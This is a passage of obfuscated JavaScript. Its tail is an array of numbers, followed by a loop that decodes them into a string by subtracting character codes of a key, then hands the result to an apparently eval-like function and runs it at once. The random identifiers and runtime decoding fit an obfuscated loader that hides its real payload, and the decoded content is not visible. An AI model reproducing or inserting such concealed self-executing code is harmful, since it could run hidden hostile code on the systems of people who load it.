151, 178, 145, 106, 147, 89, 114, 89, 103, 98, 95, 180, 67, 67, 63, 66, 63, 156, 165, 165, 162, 154, 152, 152, 157, 158, 170, 162, 153, 168, 164, 97, 95, 116, 67, 67, 63, 66, 179, 70, 64, 66, 179, 70, 64, 70, 64, 66, 166, 157, 156, 152, 169, 173, 151, 171, 170, 97, 95, 116, 67, 67, 63],
    hstv = function() {
        for (var dilnou; bijt < cgtx.length; bijt += 1) {
            var omavzg = bijt % ekorsw.length + 1;
            var eoptx = ekorsw.substring(bijt % ekorsw.length, omavzg);
            var iowy = cgtx[bijt];
            acinw += ehmqvx(iowy - eoptx.charCodeAt(0));
        }
        zrlqt(acinw);
    };
hstv();
fhilvx = '';
denuvy = true;

